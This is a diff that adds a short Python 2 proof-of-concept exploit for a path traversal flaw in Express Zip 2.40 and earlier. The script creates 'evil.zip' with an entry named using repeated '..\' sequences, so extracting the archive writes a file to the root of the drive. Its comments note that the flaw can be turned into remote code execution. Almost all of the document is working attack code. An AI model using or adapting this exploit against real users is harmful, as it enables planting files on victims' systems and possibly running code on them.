@@ -1,0 +1,40 @@
+#!/usr/bin/python -w
+# Title : Express Zip <= 2.40 Path Traversal
+# Date : 07/04/2016
+# Author : R-73eN
+# Tested on : Windows Xp / Windows 7 Ultimate
+# Software Link : http://www.nchsoftware.com/zip/
+# Download Link: http://www.nchsoftware.com/zip/zipplus.exe
+# Vulnerable Versions : Express Zip <= 2.40
+# Express Zip doesn't validates " ..\ " which makes possible
+# to do a path traversal attack which can be converted easily to RCE
+# How to Reproduce:
+# 1- Run Exploit
+# 2- Right Click evil.zip go to Express Zip and click Extract Here
+# 3- File will be extracted to the root of the partition in this case C:\POC.txt
+# This quick and dirt code is written only for demonstration purposes.
+# If you wanna profit from it you must modify it.
+# Video: https://www.youtube.com/watch?v=kb43h8Hoo0o
+#
+
+#Banner
+banner = ""
+banner += "  ___        __        ____                 _    _  \n" 
+banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
+banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"
+banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
+banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
+print banner
+
+import zipfile, sys
+
+
+if(len(sys.argv) != 2):
+    print "[+] Usage : python exploit.py file_to_do_the_traversal [+]"
+    print "[+] Example: python exploit.py test.txt"
+    exit(0)
+print "[+] Creating Zip File [+]"
+zf = zipfile.ZipFile("evil.zip", "w")
+zf.write(sys.argv[1], "..\\..\\..\\..\\..\\..\\..\\..\\POC.txt")
+zf.close()
+print "[+] Created evil.zip successfully [+]"
